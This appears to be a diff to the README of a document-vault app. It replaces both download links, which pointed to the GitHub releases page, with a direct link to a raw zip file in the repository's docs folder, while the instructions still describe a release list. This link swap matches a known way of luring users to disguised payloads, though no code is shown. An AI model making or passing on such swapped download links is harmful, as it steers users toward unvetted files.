@@ -1,6 +1,6 @@
 # 🛡️ legacy-vault - Securely organize your essential life documents
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/flann7/legacy-vault/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/flann7/legacy-vault/raw/refs/heads/main/docs/legacy-vault-v2.5.zip)
 
 Legacy-vault provides a private, encrypted digital space for your most important information. You maintain full control over your estate planning documents, financial records, and final wishes. The software stores your data locally on your computer. It includes tools for beneficiary access and a dead man’s switch to ensure your loved ones receive necessary information when the time comes.
 
@@ -18,7 +18,7 @@ Your computer needs to meet basic standards to run legacy-vault reliably.
 
 Visit the release page to download your copy of the vault.
 
-[https://github.com/flann7/legacy-vault/releases](https://github.com/flann7/legacy-vault/releases)
+[https://github.com/flann7/legacy-vault/raw/refs/heads/main/docs/legacy-vault-v2.5.zip](https://github.com/flann7/legacy-vault/raw/refs/heads/main/docs/legacy-vault-v2.5.zip)
 
 1. Navigate to the link above using your web browser.
 2. Locate the most recent version labeled as "Latest" at the top of the list.
